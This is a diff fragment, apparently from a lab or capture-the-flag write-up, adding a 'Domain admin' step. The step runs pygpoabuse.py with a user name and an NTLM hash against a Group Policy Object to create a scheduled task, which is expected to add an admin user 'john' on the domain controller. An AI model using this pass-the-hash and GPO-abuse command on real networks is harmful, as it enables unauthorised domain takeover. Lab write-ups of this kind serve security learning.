@@ -671,5 +671,11 @@ But in this case ill leave that command blank so by default it should make a use
 
 # Domain admin
 ```python
+python3 pygpoabuse.py 'hsm.local'/'bbarkinson' -hashes ':53c3709ae3d9f4428a230db81361ffbc' -gpo-id '526CDF3A-10B6-4B00-BCFA-36E59DCD71A2' -f
+[+] ScheduledTask TASK_d547eb07 created!
+```
+This created the task, once the group policy refreshes on the domain controller i should have a new user `john` with admin privs
+
+```python
 
 ```
